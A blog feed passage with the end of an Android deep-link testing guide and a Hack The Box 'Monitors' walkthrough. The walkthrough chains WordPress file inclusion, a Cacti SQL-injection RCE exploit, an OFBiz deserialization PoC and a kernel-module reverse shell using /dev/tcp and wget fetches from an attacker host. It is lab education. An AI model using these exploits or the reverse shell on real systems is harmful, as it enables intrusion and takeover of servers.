f04fc82b6d49b41c9b08982be59338c5</code></pre><p>Done :)</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 5 (Testing)]]></title><description><![CDATA[<h2 id="enumeration">Enumeration</h2><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
I: Loading resource table...
I: Decoding AndroidManifest.</code></pre>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-pat-5-testing/</link><guid isPermaLink="false">617d78ac3eb63780007bc5e3</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Oct 2021 17:20:05 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="enumeration">Enumeration</h2><img src="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" alt="Exploiting Deep Links in Android - Part 5 (Testing)"><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /Users/inesmartins/Library/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Baksmaling classes3.dex...
I: Baksmaling classes4.dex...
I: Baksmaling classes5.dex...
I: Baksmaling classes6.dex...
I: Baksmaling classes7.dex...
I: Baksmaling classes8.dex...
I: Baksmaling classes9.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory

~ open com.twitter.android_2021-10-22/AndroidManifest.xml</code></pre><p>When you open the manifest, you should start by looking for <code>&lt;intent-filter&gt;</code> elements:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-30-at-18.24.30.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 5 (Testing)" loading="lazy"></figure><p>Note the <strong>scheme</strong>, <strong>host</strong> and <strong>path</strong> attributes inside <code>&lt;data&gt;</code> elements to understand what deep links are supported, and check the <code>category</code> and <code>action</code> elements, as they give you clues about how the deep links are used.</p><p>The example below shows a Scheme URL with <code>scheme=&quot;myapp&quot;</code> and <code>host=&quot;path&quot;</code>, which means the following URI could be handled by the app: <code>myapp://path</code>.</p><pre><code>&lt;activity android:name=&quot;.MyUriActivity&quot;&gt;
  &lt;intent-filter&gt;
      &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
      &lt;data android:scheme=&quot;myapp&quot; android:host=&quot;path&quot; /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;</code></pre><p>When analysing app links, make sure the intent filter includes the &#xA0;<code>android:autoVerify=&quot;true&quot;</code> attribute, which enables app link verification:</p><pre><code>&lt;activity android:name=&quot;.MyUriActivity&quot;&gt;
  &lt;intent-filter android:autoVerify=&quot;true&quot;&gt;
      &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
      &lt;data android:scheme=&quot;http&quot; android:host=&quot;www.myapp.com&quot; android:path=&quot;/my/app/path&quot; /&gt;
      &lt;data android:scheme=&quot;https&quot; android:host=&quot;www.myapp.com&quot; android:path=&quot;/my/app/path&quot; /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</code></pre><hr><h2 id="verifying-app-link-association">Verifying App Link Association</h2><p>The simplest way to check if a link is correctly verified is to just enter it onto a mobile browser and check that the link is automatically (without any user interaction) opened with the intended app.</p><p>If you&apos;re looking for additional information, you can also use <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester/blob/main/README.md">this</a> simple Python tool that I&apos;ve developed. This library supports a bunch of different test modes and options, but most likely the <code>verify-applinks</code> option will give you what you need:</p><pre><code class="language-Python">~ python3 Android-App-Link-Verification-Tester/deeplink_analyser.py \
-apk com.twitter.android_2021-10-22.apk \
-p com.twitter.android \
-op verify-applinks

[...]

The APK&apos;s signing certificate&apos;s SHA-256 fingerprint is: 
0F:D9:A0:CF:B0:7B:65:95:09:97:B4:EA:EB:DC:53:93:13:92:39:1A:A4:06:53:8A:3B:04:07:3B:C2:CE:2F:E9

[...]

Checking http://mobile.twitter.com/.*

&#x2713; includes autoverify=true
&#x2713; includes VIEW action
&#x2713; includes BROWSABLE category
&#x2713; includes DEFAULT category
&#x2713; DAL verified

  Relations: 
    - [Standard] delegate_permission/common.get_login_creds
    - [Standard] delegate_permission/common.handle_all_urls
    - [Custom]   delegate_permission/common.use_as_origin

Checking http://twitter.com/.*

&#x2713; includes autoverify=true
&#x2713; includes VIEW action
&#x2713; includes BROWSABLE category
&#x2713; includes DEFAULT category
&#x2713; DAL verified

  Relations: 
    - [Standard] delegate_permission/common.get_login_creds
    - [Standard] delegate_permission/common.handle_all_urls
    - [Custom]   delegate_permission/common.use_as_origin

[...]

Read more about relation strings here: https://developers.google.com/digital-asset-links/v1/relation-strings</code></pre><hr><h2 id="static-and-dynamic-analysis">Static and Dynamic Analysis</h2><p>In order to understand what data is being taken from deep links and how that data is being processed, check for occurrences of:</p><ul><li><code>getIntent()</code> </li><li><code>.getData()</code></li><li><code>.getExtras()</code></li><li>Regex search: <code>\.get\w+Extra\(</code> &#xA0;-&gt; finds occurrences <code>.getStringExtra(</code>, &#xA0;<code>.getParcelableExtra(</code>, etc.)</li></ul><p>To understand how the app&#x2019;s <code>WebViews</code> are controlling which URLs are loaded and how, look for:</p><ul><li><code>shouldOverrideUrlLoading</code> </li><li><code>shouldInterceptRequest</code></li></ul><p>Finally, to see how the data or URIs are being loaded into the app&apos;s <code>WebViews</code>, check for any calls to:</p><ul><li><code>.loadUrl(</code> </li><li><code>.loadData(</code></li></ul><p>Note that, not only are these methods relevant when doing static analysis, you can also &quot;hook&quot; them with <a href="https://frida.re/docs/android/">Frida</a> when doing dynamic analysis.</p><hr><h2 id="automated-tests-and-fuzzing">Automated Tests and Fuzzing</h2><p>If you already know which deep link you you want to test, <a href="https://developer.android.com/studio/command-line/adb">adb</a> is the way to go:</p><pre><code>~ adb shell am start -W -a android.intent.action.VIEW -d &lt;url&gt;

where:
-a ~&gt; action
-W ~&gt; wait for launch to complete
-d ~&gt; URL</code></pre><p>If you want to build and send a specific Intent URL, you can create a new Android app using <a href="https://developer.android.com/studio?gclid=CjwKCAjw2vOLBhBPEiwAjEeK9up2NghnnyViWFBXSe8F-3DO0-kSFC9KH7g6q3xdkSb5GD0_g5q4nRoCiLEQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh4.googleusercontent.com/Yls7-O6Tjiy2gubg8v5SgKsTNiepUjuFaKAkvyn7CoHma9N7lpihmPKHnwrAhba7jvXyfqCx7o3mhMrTnOHOhqWAQ_UuV2ZEy8Nm-w9_Ix2gs1M2S9Ds8m1tQ1bTB9wop5yFqDOwIkk" class="kg-image" alt="Exploiting Deep Links in Android - Part 5 (Testing)" loading="lazy"></figure><p>Finally, if you have no idea what you&apos;re looking for, maybe give fuzzing a try with <a href="https://labs.f-secure.com/tools/drozer/">drozer</a>&apos;s <a href="https://github.com/FSecureLABS/drozer-modules/blob/master/intents/fuzzinozer.py">fuzzinozzer</a> module:</p><pre><code>dz&gt; run intents.fuzzinozer --complete_test --package com.twitter.android --save_state</code></pre><hr><p>And this is it, the end of the road for this series.<br>Hope you learned something!</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Monitors]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Let&apos;s start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
Nmap scan report for 10.10.10.238
Host is</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-monitors/</link><guid isPermaLink="false">608d24d93241306f9f095bbd</guid><category><![CDATA[htb]]></category><category><![CDATA[wordpress]]></category><category><![CDATA[wpscan]]></category><category><![CDATA[wp-with-spritz]]></category><category><![CDATA[LFI]]></category><category><![CDATA[cacti]]></category><category><![CDATA[rce]]></category><category><![CDATA[sqli]]></category><category><![CDATA[sql injection]]></category><category><![CDATA[docker]]></category><category><![CDATA[apache ofbiz]]></category><category><![CDATA[metasploit]]></category><category><![CDATA[privesc]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 09 Oct 2021 16:17:00 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png" alt="HTB Write-up | Monitors"><p>Let&apos;s start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
Nmap scan report for 10.10.10.238
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn&apos;t have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There&apos;s an <code>Apache</code> web server running on port 80 but we can&apos;t access it with the IP alone:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="723" height="179" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image.png 600w, inesmartins.github.io/content/images/2021/05/image.png 723w" sizes="(min-width: 720px) 720px"></figure><p>Luckily the virtual host is pretty obvious:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-2.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="1440" height="720" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-2.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-2.png 1000w, inesmartins.github.io/content/images/2021/05/image-2.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>According to the footer the website was built using Wordpress, so let&apos;s run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-19.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="726" height="341" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-19.png 600w, inesmartins.github.io/content/images/2021/05/image-19.png 726w" sizes="(min-width: 720px) 720px"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-55.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="877" height="551" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-55.png 600w, inesmartins.github.io/content/images/2021/05/image-55.png 877w"></figure><hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we&apos;re able to access their home directory, but we can&apos;t read <code>user.txt</code>. </p><p>Let&apos;s try to read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-51.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="959" height="813" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-51.png 600w, inesmartins.github.io/content/images/2021/05/image-51.png 959w"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: &apos;wordpress&apos;
DB_USER: &apos;wpadmin&apos;
DB_PASSWORD: &apos;BestAdministrator@2020!&apos;</code></pre><p>Unfortunately, we don&apos;t have permissions to access the database locally and can&apos;t access the service from a remote machine. So, let&apos;s try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os

baseurl = &apos;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=/&apos;

entries = open(&apos;lfi_payloads.txt&apos;, &apos;r&apos;).read().split(&apos;\n&apos;)

for entry in entries:
	print(&apos;Trying &apos; + entry)
	os.system(&apos;curl &apos; + baseurl + entry + &apos; -O&apos;)</code></pre><p>After some trial and error we finally get something interesting on <code>etc/apache2/sites-enabled/000-default.conf</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-67.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="exploring-cacti-admin">Exploring cacti-admin</h2><p>Let&apos;s configure our new virtual host and access the website:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.10.238    cacti-admin.monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-68.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="1440" height="747" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-68.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-68.png 1000w, inesmartins.github.io/content/images/2021/05/image-68.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Luckily we can use the credentials we found on the last step and get in: <code>admin</code>/<code>BestAdministrator@2020!</code></p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-71.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="1440" height="647" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-71.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-71.png 1000w, inesmartins.github.io/content/images/2021/05/image-71.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the source code, we see that this application is using <a href="https://github.com/Cacti/cacti/releases/tag/release%2F1.2.12">Cacti version 1.2.12</a>, which has a lot of known vulnerabilities including an RCE via SQL Injection.</p><p>And better yet, there&apos;s a <a href="https://www.exploit-db.com/exploits/49810">working payload on ExploitDB</a>:</p><pre><code>~ python cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.122 --lport 4444
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:105acde9cf997ef401f3eaaf5a884e62c9776fa1,1620939044
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
&quot;name&quot;,&quot;hex&quot;
&quot;&quot;,&quot;&quot;
&quot;admin&quot;,&quot;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&quot;
&quot;guest&quot;,&quot;43e9a4ab75570f5b&quot;

[+] Check your nc listener!</code></pre><p>And we have a shell!</p><pre><code>$ whoami
www-data</code></pre><p>Let&apos;s upgrade it to an interactive shell:</p><pre><code>~ python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
www-data@monitors:/usr/share/cacti/cacti</code></pre><hr><h2 id="getting-user">Getting user</h2><pre><code>www-data@monitors:/home/marcus$ su marcus
Password: BestAdministrator@2020!</code></pre><p>After failing to get anything interesting on the user&apos;s home directory, I tried to find all files with string &quot;marcus&quot;:</p><pre><code>$ grep &quot;marcus&quot; /etc -R 2&gt;/dev/null

/etc/group-:marcus:x:1000:
/etc/subgid:marcus:165536:65536
/etc/group:marcus:x:1000:
/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
/etc/subuid:marcus:165536:65536
/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
</code></pre><p>The <code>cacti-backup</code> service looks interesting:</p><pre><code>$ cat /etc/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target</code></pre><p>Let&apos;s see if we can read the script that&apos;s being called:</p><pre><code>$ cat /home/marcus/.backup/backup.sh

#!/bin/bash

backup_name=&quot;cacti_backup&quot;
config_pass=&quot;VerticalEdge2020&quot;

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p &quot;${config_pass}&quot; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip</code></pre><p>That&apos;s an interesting password &#x1F609;</p><pre><code>$ su marcus
su marcus
Password: VerticalEdge2020

marcus@monitors:/usr/share/cacti/cacti$ cat /home/marcus/user.txt
cat /home/marcus/user.txt
1f9e04959870f6cd3c13216d0cf00583</code></pre><p>And now we&apos;re able to access via SSH, which is a lot easier:</p><pre><code>~ ssh marcus@monitors.htb
marcus@monitors.htb&apos;s password:
&gt; VerticalEdge2020

...

marcus@monitors:~$</code></pre><hr><h2 id="red-herring">Red Herring</h2><p>It seems like <code>marcus</code> left a note in their home directory:</p><pre><code>marcus@monitors:~$ cat note.txt

TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	-</code></pre><p>Since the Docker image might be deprecated, let&apos;s filter out all of the processes running on the machine that are Docker-related:</p><pre><code>$ ps aux | grep docker

root       1527  0.0  2.0 1196956 82704 ?       Ssl  11:42   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

root       2006  0.1  0.2 628508  8864 ?        Sl   11:42   0:15 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443

root       2039  0.0  0.1 108820  5768 ?        Sl   11:42   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/a2e16ca5647428c5f43ce47fd08272fd8738ed80d3db0e6cf4bcb15370bbf184 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</code></pre><p>Note that all of these are ran by <code>root</code>, and the <code>docker</code> group doesn&apos;t contain any user, which means we can&apos;t use most of the known privesc Docker vectors:</p><pre><code>$ cat /etc/group | grep docker
docker:x:999:
$ cat /etc/passwd | grep 999</code></pre><p>Let&apos;s see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-16.07.27.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><p>There doesn&apos;t seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container&apos;s (<code>172.17.0.2</code>) TCP port <code>8443</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-15.43.35.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><p>So we can SSH tunnel to see what&apos;s running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
marcus@monitors.htb&apos;s password: 
&gt; VerticalEdge2020

~ ps aux | grep 8443
inesmartins      38886   0.0  0.0  4331440    648   ??  Ss   12:35PM   0:00.00 ssh -L 8443:localhost:8443 marcus@monitors.htb -fNT
</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-92.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for <code>ofbiz-vm.apache.org</code>, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443

PORT     STATE SERVICE  VERSION

8443/tcp open  ssl/http Apache Tomcat 9.0.31
|_http-title: Site doesn&apos;t have a title (text/plain;charset=UTF-8).
| ssl-cert: Subject: commonName=ofbiz-vm.apache.org/organizationName=Apache Software Fundation/stateOrProvinceName=DE/countryName=US
...</code></pre><blockquote><strong>Apache OFBiz</strong> is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.</blockquote><p>This framework has some <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&amp;product_id=28350&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=33&amp;sha=6402b2a5500eca02d0aa351eb1febae7c45a174a">serious vulnerabilities</a>, one of them being <code>CVE-2020-9496</code> which enables unauthenticated RCE:</p><blockquote>OfBiz exposes an <code>XMLRPC</code> endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the <code>XMLRPC</code> request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</blockquote><p>I found a really <a href="https://github.com/ambalabanov/CVE-2020-9496">great POC on Github</a> and gave it a shot:</p><pre><code>~ git clone git@github.com:ambalabanov/CVE-2020-9496.git
~ cd CVE-2020-9496
~ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
~ brew install --cask adoptopenjdk8brew tap adoptopenjdk/openjdk
~ brew tap adoptopenjdk/openjdk
~ java -version
~ export JAVA_HOME=`/usr/libexec/java_home -v 1.8.0_292`</code></pre><p>I setup a local server:</p><pre><code>~ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>... and sent a curl command to see if the container would connect to it:</p><pre><code>~ python3 cve-2020-9496.py --target https://localhost:8443
cmd&gt; curl http://10.10.14.9:9000
[!] Send payload ...
[+] Done!</code></pre><p>I got a connection from <code>10.10.10.238</code> which is the host machine&apos;s IP, so I knew this was working:</p><pre><code>10.10.10.238 - - [29/Sep/2021 21:37:38] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre><p>With RCE on the container, I decided to make enumeration a little easier and faster with a Python script:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/66ed776a17b81a2313a78ba3456867d0.js"></script><!--kg-card-end: html--><p>After using this script with some <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Seclists</a>, I couldn&apos;t find any relevant files or hints, so I started thinking that this was a straightforward container escape.</p><p>I was also getting a little frustrated with not having a shell into the machine, so I decided to abandon my script and give Metasploit a try.</p><p>After some tweaking, I finally got it:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-02-at-14.10.53.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="the-final-step">The final step</h2><p>This was definitely the hardest part. I knew I had to escape from the container, and tried a lot of known exploits without any luck.</p><p>Finally, after a loooong and frustrating process I found <a href="https://xcellerator.github.io/posts/docker_escape/">this</a> article from 2020: &quot;Privileged Container Escapes with Kernel Modules&quot;:</p><blockquote>It turns out that privileged containers (or just those with <code>CAP_SYS_MODULE</code>) are able to use the <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_init_module()</code></a> and <a href="https://man7.org/linux/man-pages/man2/finit_module.2.html"><code>sys_finit_module()</code></a> syscalls - which are what&#x2019;s used to load kernel modules. <br>As all containers share their kernel with the host (unlike VMs), this clearly results in yet another complete system compromise.</blockquote><p>This led me to find <a href="https://blog.nody.cc/posts/container-breakouts-part2/">this</a> POC:</p><figure class="kg-card kg-code-card"><pre><code>#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;AttackDefense&quot;);
MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
MODULE_VERSION(&quot;1.0&quot;);
char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.10.238/4444 0&gt;&amp;1&quot;, NULL};
static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/8/&quot;, NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO &quot;Exiting\n&quot;);
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);</code></pre><figcaption>reverse-shell.c</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre><figcaption>Makefile</figcaption></figure><p>Note how the reverse shell is targeted at the host machine, on port <code>4444</code>, so we need to setup that listener:</p><pre><code>marcus@monitors:~$ nc -nvlp 4444</code></pre><p>On our machine, let&apos;s serve these files so that the container can fetch them using <code>wget</code>:</p><pre><code>~ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...</code></pre><p>Now, on the Metasploit shell, let&apos;s fetch the <code>reverse-shell.c</code> and <code>Makefile</code>, build the payload and trigger it:</p><pre><code>&gt; sessions -i 1
[*] Starting interaction with 1...

python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;

root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# whoami
root

root@79931c1ed9a2:/usr/src/apache-ofbiz-17.12.01# cd /

root@79931c1ed9a2:/# wget http://10.10.14.22:9000/reverse-shell.c
root@79931c1ed9a2:/# wget http://10.10.14.22:9000/Makefile
root@79931c1ed9a2:/# export PATH=/usr/lib/gcc/x86_64-linux-gnu/8/:$PATH
root@79931c1ed9a2:/# make clean
root@79931c1ed9a2:/# make
root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that&apos;s it!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a 